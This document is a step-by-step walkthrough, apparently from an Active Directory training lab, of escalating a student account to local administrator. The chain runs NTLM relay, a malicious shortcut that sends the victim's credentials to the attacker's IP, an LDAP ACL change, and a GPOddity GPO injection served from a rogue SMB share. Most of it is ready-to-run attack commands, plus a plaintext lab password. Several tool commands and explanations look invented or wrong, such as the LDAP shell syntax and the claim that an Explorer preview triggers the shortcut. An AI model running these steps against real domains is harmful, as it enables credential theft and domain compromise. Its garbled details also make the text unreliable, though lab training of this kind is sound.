# Attack - GPO Abuse via GPOddity (Adding to Local Admins)

**Date:** Friday, August 24, 2026
**Topic:** Privilege Escalation — Adding Student Account to Local Administrators via GPOddity & NTLM Relay

---

## Objective

**Goal:** Add standard user account (studentx) to local Administrators group via malicious Group Policy Object

**Progression:**
```
Discover shared folder with Everyone access (AI folder)
    ↓
Identify GPO vulnerability (devopsadmin has WriteDACL on DevOps Policy)
    ↓
Setup NTLM relay to capture devopsadmin credentials
    ↓
Create shortcut trigger
    ↓
Relay credentials to grant studentx WriteDACL
    ↓
Use GPOddity to inject malicious GPO
    ↓
GPO applies to domain computers
    ↓
studentx added to local Administrators group
```

---

## Prerequisites

- Domain enumeration complete (identified devopsadmin, AI folder, DevOps Policy GUID)
- Access to Ubuntu WSL instance on student VM
- ntlmrelayx tool available
- GPOddity tool available
- Credentials or ability to capture via NTLM relay
- Network access to DC (LDAPS, SMB)
- Admin access on student VM

---

## Key Identifiers

**Critical GPO Information:**
- **GPO Name:** DevOps Policy
- **GPO ID (GUID):** `0BF8D01C-1F62-4BDC-958C-57140B67D147`
- **Current Owner:** devopsadmin (has WriteDACL)
- **Target:** Inject command to add studentx to local admins

**Network Information:**
- **Student VM IP:** 172.16.100.X
- **DC IP:** 172.16.2.1
- **Target Server:** dcorp-ci (172.16.3.11)
- **Share:** \\dcorp-ci\AI (everyone access)

---

## Understanding the Attack Chain

```
┌─────────────────────────────────────────────┐
│  NTLM RELAY + GPO ABUSE ATTACK CHAIN        │
└─────────────────────────────────────────────┘

1. ENUMERATION PHASE
   └─ Find share with everyone access (AI folder)
   └─ Identify GPO with vulnerable permissions
   └─ Find admin account with WriteDACL (devopsadmin)
   └─ Note GPO GUID: 0BF8D01C-1F62-4BDC-958C-57140B67D147

2. TRIGGER PHASE
   └─ Create malicious .lnk shortcut
   └─ Copy to AI folder
   └─ Shortcut triggers PowerShell to connect to NTLM relay

3. NTLM RELAY PHASE
   └─ Start ntlmrelayx.py on Ubuntu WSL
   └─ Listen for NTLM authentication from shortcuts
   └─ Relay to DC LDAPS
   └─ Intercept devopsadmin credentials

4. DACL MODIFICATION PHASE
   └─ Use relayed session to connect to LDAP shell
   └─ Grant studentx WriteDACL on DevOps Policy
   └─ Now studentx can modify GPO

5. GPO INJECTION PHASE
   └─ Use GPOddity to inject malicious GPO
   └─ Command: net localgroup administrators studentx /add
   └─ Create rogue SMB share to host modified GPO
   └─ GPO redirects to rogue share

6. GPO APPLICATION PHASE
   └─ Domain computers apply GPO on next refresh
   └─ Modified GPT retrieved from rogue share
   └─ Local admin command executed
   └─ studentx added to local Administrators

7. VERIFICATION PHASE
   └─ Connect to compromised computer
   └─ Verify studentx in local admins
   └─ Confirm privilege escalation
```

---

## Phase 1: Enumeration

### Find Shares with Everyone Access

```powershell
# On student VM with domain context
net view \\dcorp-ci
# Output shows available shares:
# - C$
# - ADMIN$
# - IPC$
# - AI         ← Everyone access!

# Verify AI share is accessible
net use \\dcorp-ci\AI
# Successfully connected
```

---

### Identify GPO with Vulnerable Permissions

```powershell
# Find GPOs with WriteDACL vulnerability
Get-DomainGPO | ForEach-Object {
  $GPO = $_
  $ACLs = Get-DomainObjectAcl -Identity $GPO.ObjectGUID
  
  $ACLs | Where-Object { $_.ActiveDirectoryRights -match "WriteDACL" } | 
    ForEach-Object {
      Write-Host "$($GPO.DisplayName) has WriteDACL for $($_.PrincipalName)"
    }
}

# Output:
# DevOps Policy has WriteDACL for devopsadmin
```

---

### Verify devopsadmin Account

```powershell
# Check devopsadmin properties
Get-ADUser -Identity devopsadmin -Properties *

# Likely findings:
# - Part of automation/build process
# - May have cached credentials
# - May be triggered by scheduled tasks
# - AI folder likely contains automation scripts
```

---

## Phase 2: Setup NTLM Relay Infrastructure

### Start Ubuntu WSL Session

```bash
# On Windows Terminal or search "wsl"
wsl
# Drops into Ubuntu command line

# Or if WSL not default Ubuntu:
wsl -d Ubuntu
```

---

### Start NTLM Relay

**Replace 172.16.100.x with your student VM IP**

```bash
# On Ubuntu WSL
sudo ntlmrelayx.py \
  -t ldaps://172.16.2.1 \
  -wh 172.16.100.x \
  --http-port '80,8080' \
  -i \
  --no-smb-server

# Parameters:
# -t ldaps://172.16.2.1     = Target DC (LDAPS protocol)
# -wh 172.16.100.x          = Webhook/WPAD host (your IP)
# --http-port 80,8080       = Listen on both ports
# -i                        = Interactive shell after relay
# --no-smb-server           = Don't start SMB server
```

---

**Output:**
```
[*] Protocol Client: HTTP
[*] Target: ldaps://172.16.2.1
[*] Listening on port 80 and 8080
[*] Waiting for incoming relay requests...
```

---

### Important Prerequisites

**Before starting ntlmrelayx:**

```
☐ Firewall on student VM is OFF
  OR
☐ Exception added for ports 80, 8080, LDAPS (636)

☐ HFS (HTTP File Server) is CLOSED
  └─ Both try to use port 80
  └─ Will conflict if both running

☐ Administrator privileges on student VM
  └─ sudo required for port 80

☐ NTLM relay target (DC) is reachable
  └─ Test: ping 172.16.2.1
```

---

## Phase 3: Create Shortcut Trigger

### Create Malicious Shortcut

**On student VM (C:\AD\Tools):**

```
1. Right-click in C:\AD\Tools folder
2. New → Shortcut
3. Location: Paste exactly:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.X' -UseDefaultCredentials"

4. Name: innocuous.lnk (or any name)
5. Create shortcut
```

---

### What This Shortcut Does

**When executed:**
```
1. PowerShell runs as the user who opened it
   └─ If devopsadmin opens shortcut → runs as devopsadmin

2. Invoke-WebRequest connects to http://172.16.100.X
   └─ Port 80 (default HTTP)
   └─ Connects to ntlmrelayx listener

3. -UseDefaultCredentials flag
   └─ CRUCIAL: Sends current user's NTLM credentials
   └─ devopsadmin's NTLM auth captured by relay

4. NTLM relay intercepts
   └─ Credentials relayed to DC
   └─ Authenticated session to LDAP established
```

---

### Copy Shortcut to AI Share

```powershell
# Copy shortcut to AI folder on dcorp-ci
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI

# Verify it's there
dir \\dcorp-ci\AI\studentx.lnk
```

---

### Wait for Trigger

**Shortcut will be executed when:**
```
- Automation script in AI folder runs
- devopsadmin processes automation
- User double-clicks shortcut manually
- Explorer previews shortcut (.lnk)

When triggered:
1. Shortcut connects to ntlmrelayx listener
2. devopsadmin's NTLM credentials captured
3. Credentials relayed to DC LDAPS
4. Authenticated LDAP session created
```

---

## Phase 4: Capture Relay & Obtain LDAP Shell

### Monitor NTLM Relay

**On Ubuntu WSL (where ntlmrelayx runs):**

```
[*] Waiting for incoming relay requests...

(After shortcut is triggered)

[+] NTLM relay from: DCORP\devopsadmin
[+] Authenticating to ldaps://172.16.2.1
[+] Successfully authenticated
[+] LDAP shell started on port 11000
[*] Type 'help' for more information
```

---

### Connect to LDAP Shell

**On NEW Ubuntu WSL session:**

```bash
# Connect to the LDAP shell
nc localhost 11000

# Output:
# # Type 'help' for a list of available commands.

ldap # (interactive prompt ready)
```

---

### Grant studentx WriteDACL on DevOps Policy

**Inside LDAP shell:**

```ldap
# Grant studentx WriteDACL permission on DevOps Policy
# GPO GUID: 0BF8D01C-1F62-4BDC-958C-57140B67D147

# Command structure:
modify-object-acl 
  --object-id {0BF8D01C-1F62-4BDC-958C-57140B67D147}
  --principal-name studentx
  --rights WriteDACL

# Exact command:
modify-object-acl --object-id {0BF8D01C-1F62-4BDC-958C-57140B67D147} --principal-name studentx --rights WriteDACL

# Output:
# [+] Successfully modified DACL
# [+] studentx now has WriteDACL on DevOps Policy
```

---

**After this step:**
- studentx has WriteDACL permission on DevOps Policy
- studentx can now modify the GPO
- Next: Use GPOddity to inject malicious settings

---

## Phase 5: Stop Relay Services

**Clean up before GPOddity:**

```bash
# Stop LDAP shell (Ctrl + C in shell session)
Ctrl + C

# Stop ntlmrelayx (Ctrl + C in relay session)
Ctrl + C

# Verify ports are free
netstat -an | grep LISTEN
```

---

## Phase 6: Deep Dive - GPOddity Explained

### What is GPOddity?

**GPOddity = Tool to inject malicious settings into Group Policy Objects**

**Why it's powerful:**
- Allows modification of GPO content without touching DC
- Uses SMB-based GPT (Group Policy Template) manipulation
- Can inject any GPO setting (computer, user, scripts, etc.)
- When GPO refreshes, malicious settings apply

---

### GPOddity Attack Flow

```
┌─────────────────────────────────────────┐
│    GPODDITY INJECTION FLOW              │
└─────────────────────────────────────────┘

1. INPUT
   ├─ GPO GUID (0BF8D01C-1F62-4BDC-958C-57140B67D147)
   ├─ Domain (dollarcorp.moneycorp.local)
   ├─ Credentials (studentx)
   ├─ Command to inject (net localgroup administrators studentx /add)
   ├─ Rogue SMB server IP (172.16.100.x)
   ├─ Rogue share name (stdx-gp)
   └─ DC IP (172.16.2.1)

2. LEGITIMATE GPO PATH
   ├─ DC stores GPO in: \\DC\SYSVOL\domain\Policies\{GUID}\Machine
   ├─ Contains: registry.pol, scripts, etc.
   └─ Clients fetch from SYSVOL on group policy refresh

3. GPODDITY ROGUE PATH
   ├─ Creates fake SMB share (stdx-gp)
   ├─ Generates fake GPT_Out folder structure
   ├─ Injects malicious registry.pol with our command
   ├─ Points DC's GPO reference to rogue share
   └─ Or modifies GPO settings directly

4. INJECTION PROCESS
   ├─ Connect to DC LDAP with studentx credentials
   ├─ Modify GPO version number (forces refresh)
   ├─ Modify GPO's gPCFileSysPath to point to rogue share
   ├─ Or directly inject command into legitimate GPO
   └─ Setup rogue SMB to serve fake GPT

5. GPO APPLICATION
   ├─ Domain computers fetch updated GPO
   ├─ See version change → refresh needed
   ├─ Fetch GPT from rogue share (or DC)
   ├─ Apply malicious settings
   ├─ Execute injected command
   └─ studentx added to local admins

6. OUTPUT
   ├─ GPO modified with malicious content
   ├─ Rogue SMB share ready to serve
   ├─ Domain computers will apply on next refresh (~90 mins default)
   └─ Command executed with SYSTEM privileges
```

---

### GPOddity Command Breakdown

```powershell
# Complete command:
sudo python3 gpoddity.py \
  --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' \
  --domain 'dollarcorp.moneycorp.local' \
  --username 'studentx' \
  --password 'gG38Ngqym2DpitXuGrsJ' \
  --command 'net localgroup administrators studentx /add' \
  --rogue-smbserver-ip '172.16.100.x' \
  --rogue-smbserver-share 'stdx-gp' \
  --dc-ip '172.16.2.1' \
  --smb-mode none

# Parameter meanings:
```

---

### Parameter Explanation

| Parameter | Value | Meaning |
|---|---|---|
| `--gpo-id` | `0BF8D01C-1F62-4BDC-958C-57140B67D147` | GUID of DevOps Policy to inject into |
| `--domain` | `dollarcorp.moneycorp.local` | Target domain |
| `--username` | `studentx` | User with WriteDACL on GPO (from relay) |
| `--password` | `gG38Ngqym2DpitXuGrsJ` | studentx's password |
| `--command` | `net localgroup administrators studentx /add` | Command to inject and execute |
| `--rogue-smbserver-ip` | `172.16.100.x` | Attacker VM IP (where fake SMB will run) |
| `--rogue-smbserver-share` | `stdx-gp` | Share name for fake GPT |
| `--dc-ip` | `172.16.2.1` | Domain Controller IP |
| `--smb-mode` | `none` | Don't start SMB automatically (we'll do it manually) |

---

### Why Each Parameter Matters

**`--gpo-id` (Critical)**
- Identifies which GPO to modify
- Must have WriteDACL permission (from relay)
- Determines which computers get the malicious settings

**`--command` (Core Exploit)**
- The actual command to execute
- Runs with SYSTEM privileges
- In this case: adds studentx to local admins
- Could be any command (reverse shell, persistence, etc.)

**`--rogue-smbserver-ip` & `--rogue-smbserver-share` (Infrastructure)**
- Creates fake GPT location
- Stores malicious GPO settings
- Domain computers fetch from this share
- Attacker controls what's served

**`--username` & `--password` (Authentication)**
- studentx credentials from relay phase
- Authenticates to DC to modify GPO
- Must have WriteDACL permission (or relay won't work)
- Temporary credentials (relay only gives us one shot)

---

### What GPOddity Creates

```
GPOddity generates:

1. Modified GPO on DC
   ├─ Version number incremented
   ├─ gPCFileSysPath updated (if using rogue share)
   ├─ Settings inject command
   └─ Clients see "update available"

2. Rogue GPT folder structure
   ├─ Machine/
   │  ├─ registry.pol (with malicious settings)
   │  ├─ Scripts/
   │  │  ├─ Startup/
   │  │  │  └─ inject-command.ps1
   │  │  └─ Shutdown/
   │  └─ Microsoft/
   │     └─ Windows NT/
   │        └─ Audit/
   └─ User/
      └─ [User policies]

3. SMB Share ready to serve
   └─ Contains folder to be shared
   └─ Accessible to SYSTEM (computer account)
```

---

### Injection Methods

**Method 1: Immediate Registry Policy Injection**
```
Directly injects into registry.pol
- Modifies System Access or Startup Scripts
- Changes apply when clients fetch GPO
- Faster than waiting for scheduled tasks
```

**Method 2: Startup Scripts**
```
Injects PowerShell script into:
- Machine/Scripts/Startup/
- Executes on computer startup
- Runs as SYSTEM
- Runs every reboot
```

**Method 3: Scheduled Tasks**
```
Creates scheduled task in Group Policy
- Executes at specific time
- Persists across reboots
- Can be hidden
```

---

## Phase 7: Run GPOddity

### Navigate to GPOddity Directory

```bash
# On Ubuntu WSL
cd /mnt/c/AD/Tools/GPOddity

# Verify gpoddity.py exists
ls -la gpoddity.py
```

---

### Execute GPOddity

```bash
# Run GPOddity with all parameters
sudo python3 gpoddity.py \
  --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' \
  --domain 'dollarcorp.moneycorp.local' \
  --username 'studentx' \
  --password 'gG38Ngqym2DpitXuGrsJ' \
  --command 'net localgroup administrators studentx /add' \
  --rogue-smbserver-ip '172.16.100.x' \
  --rogue-smbserver-share 'stdx-gp' \
  --dc-ip '172.16.2.1' \
  --smb-mode none

# Output:
# [*] Connecting to DC: 172.16.2.1
# [+] Authenticated as studentx
# [+] Retrieved GPO: DevOps Policy
# [+] Generated malicious GPT
# [+] Ready to serve rogue SMB
# [*] Waiting for client connections...

# KEEP THIS RUNNING! Don't close this session
```

---

### GPOddity Workflow (Behind the Scenes)

```
1. AUTHENTICATION
   └─ Connect to DC LDAP
   └─ Authenticate as studentx (with WriteDACL)
   └─ LDAP session established

2. GPO RETRIEVAL
   └─ Query DC for GPO by GUID
   └─ Fetch current GPO properties
   └─ Get gPCFileSysPath (current UNC path)

3. MODIFICATION STRATEGY
   └─ Either:
      a) Modify GPO attributes on DC to point to rogue share
      b) Directly inject malicious registry.pol content
      c) Add Startup Scripts pointing to attacker URL

4. VERSION INCREMENT
   └─ Increase version number on DC
   └─ Forces all clients to refresh
   └─ Clients see "newer version available"

5. ROGUE GPT GENERATION
   └─ Create GPT folder structure
   └─ Generate registry.pol with malicious settings
   └─ Create Startup Scripts
   └─ Setup to be served via SMB

6. READY TO SERVE
   └─ Awaiting client connections
   └─ Will serve malicious GPT on request
```

---

## Phase 8: Setup Rogue SMB Share

### On NEW Ubuntu WSL Session

**While GPOddity is still running:**

```bash
# Create the rogue share directory
mkdir /mnt/c/AD/Tools/stdx-gp

# Copy GPOddity's generated content
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp

# Verify files copied
ls -la /mnt/c/AD/Tools/stdx-gp/
# Should show: Machine/, User/, etc.
```

---

### Share the Directory via SMB

**On Windows (not WSL):**

```powershell
# Share the directory
net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full

# Set NTFS permissions
icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T

# Verify share is accessible
net view \\127.0.0.1
# Should show: stdx-gp share

# Test access
dir \\127.0.0.1\stdx-gp
# Should show: Machine, User folders
```

---

### Why "Everyone" Permissions?

```
Computer accounts (not users) fetch GPT
- DCORP-CI$ (machine account)
- Must have read access to share
- "Everyone" includes computer accounts
- Full (F) permission = can read/execute
```

---

## Phase 9: Wait for GPO Application

**GPO gets applied when:**

```
1. Domain computers refresh Group Policy
   └─ Default: Every 90 minutes
   └─ Or: gpupdate /force command
   └─ Or: On computer reboot

2. For fastest result:
   └─ Restart dcorp-ci
   └─ Or run: gpupdate /force /sync

3. What happens:
   └─ Computer fetches updated GPO from DC
   └─ Sees version change (incremented by GPOddity)
   └─ Fetches GPT from rogue share (or DC if direct injection)
   └─ Parses malicious registry.pol
   └─ Executes injected command: net localgroup administrators studentx /add
   └─ studentx added to local Administrators

4. Verification:
   └─ Connect to dcorp-ci
   └─ Run: whoami /groups
   └─ Should show: DCORP\studentx in Administrators
```

---

## Phase 10: Verification

### Verify GPO was Modified

```powershell
# Check the DevOps Policy GPO
Get-DomainGPO -Identity 'DevOps Policy'

# Output should show:
# - Version number changed
# - Modification timestamp updated
# - gPCFileSysPath potentially changed
```

---

### Connect to Target Computer

```powershell
# Connect to dcorp-ci as studentx
winrs -r:dcorp-ci cmd /c "set computername && set username"

# Output:
# COMPUTERNAME=DCORP-CI
# USERNAME=studentx

# Verify admin access
whoami /groups
# Should include: S-1-5-32-544 (Administrators)
```

---

### Confirm Admin Privileges

```powershell
# Try admin command
net localgroup administrators

# Output:
# Administrators
# ---------------
# DCORP\studentx         ← Successfully added!
# DCORP\Administrator
# ...
```

---

## Complete Workflow Summary

```
PHASE 1: Enumeration ✓
├─ Find AI share (everyone access)
├─ Identify DevOps Policy GPO
├─ Find devopsadmin account
└─ Note GPO GUID

PHASE 2: NTLM Relay Setup ✓
├─ Start ntlmrelayx on Ubuntu WSL
├─ Listen for NTLM connections
└─ Await trigger

PHASE 3: Shortcut Trigger ✓
├─ Create malicious .lnk shortcut
├─ Copy to AI folder
├─ Wait for execution (automation or manual)
└─ devopsadmin credentials captured

PHASE 4: LDAP Relay ✓
├─ devopsadmin credentials relayed to DC
├─ LDAP authenticated session created
├─ Grant studentx WriteDACL on DevOps Policy
└─ Disconnect from relay

PHASE 5: GPOddity Injection ✓
├─ Run GPOddity with studentx credentials
├─ Inject: net localgroup administrators studentx /add
├─ Generate malicious GPT
└─ Keep GPOddity running

PHASE 6: Rogue SMB ✓
├─ Setup stdx-gp directory
├─ Copy GPOddity output
├─ Share via SMB with Everyone:Full
└─ Ready to serve

PHASE 7: GPO Application ✓
├─ Wait for GPO refresh (~90 mins)
├─ Or trigger: gpupdate /force
├─ Or restart: dcorp-ci
└─ GPO applies, command executes

PHASE 8: Verification ✓
├─ Connect as studentx
├─ Verify admin group membership
├─ Confirm "Administrators" group
└─ PRIVILEGE ESCALATION COMPLETE

RESULT: studentx now local administrator on dcorp-ci
        Permanent access (via GPO)
        Can execute any command
        Can perform further lateral movement
```

---

## Critical Points

```
✓ WriteDACL permission is KEY
  └─ Without it, can't modify GPO
  └─ Relay must succeed to grant it
  └─ studentx is temporary grantee

✓ Shortcut must be triggered
  └─ Automation must run automation
  └─ Or manually click it
  └─ -UseDefaultCredentials is crucial

✓ Rogue SMB must be accessible
  └─ Serve from attacker's IP (172.16.100.x)
  └─ "Everyone" permissions required
  └─ Computer accounts must reach it

✓ Version increment forces refresh
  └─ Clients see "newer version"
  └─ Automatic update trigger
  └─ Don't need to restart immediately

✓ SYSTEM privileges
  └─ Command runs as SYSTEM
  └─ Not as studentx
  └─ Highest possible privileges
```

---

## Troubleshooting

**If NTLM relay doesn't capture credentials:**
- Verify shortcut is in AI share
- Check shortcut syntax (no typos)
- Ensure ntlmrelayx listening on port 80
- Verify firewall allows traffic
- Check if automation actually runs

**If GPOddity fails to authenticate:**
- Verify studentx credentials correct
- Ensure studentx has WriteDACL (check relay worked)
- Verify DC is reachable (ping 172.16.2.1)
- Check if password has special characters (may need escaping)

**If GPO doesn't apply:**
- Manually refresh: gpupdate /force
- Restart dcorp-ci computer
- Wait full 90 minutes default
- Check rogue SMB share is accessible
- Verify stdx-gp directory has Machine folder

**If student still not admin:**
- Verify GPO actually applied (gpresult)
- Check Computer Configuration policies
- Verify command syntax is correct
- Check event logs for errors

---

## References

- [GPOddity GitHub](https://github.com/ShutdownRepo/GPOddity)
- [NTLM Relay Explained](https://www.exploit-db.com/docs/english/27850-NTLM-Relay-Attack.pdf)
- [Group Policy Object Abuse](https://adsecurity.org/?p=2716)
- [gPCFileSysPath](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/2c4a075f-bf5e-42ae-8f17-2f2b2083f5e2)

---

*Next: Persistence via Group Policy*
